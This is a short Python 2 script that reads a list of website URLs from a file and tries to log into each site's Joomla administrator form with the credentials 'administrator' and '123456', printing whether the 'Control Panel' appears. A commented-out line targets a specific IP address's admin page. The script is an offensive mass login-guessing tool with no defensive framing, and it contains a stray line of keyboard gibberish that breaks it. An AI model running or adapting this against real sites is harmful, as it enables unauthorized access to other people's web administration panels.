#!/usr/bin/python

from bs4 import BeautifulSoup
import urllib
import mechanize
import os

# page = urllib.urlopen("http://109.123.90.187/joomlatest/administrator")
# login = BeautifulSoup(page.read(), "lxml")
#
# print page.code

gafgfdsagsdgfdsfgsd

error = "Usernames and password do not match or you do not have an"
sussuc = "Control Panel"
br = mechanize.Browser()
br.set_handle_robots(False)
fopen = open("/root/PycharmProjects/untitled/project/sites.txt", "r")

for line in fopen.readlines():
    print line.strip()

    try:
        page = br.open(str(line))
    except:
        print "url can not be opened"

    try:
        for  form in br.forms():


            br.select_form(nr=0)
            br.form["username"] = "administrator"
            br.form["passwd"] = "123456"
            br.submit()
            readingPage = br.response().read()
            if error in readingPage:
                print "wrong credential"
            elif sussuc in readingPage:
                print "succeffuly loged in"

    except:
            pass

fopen.close()






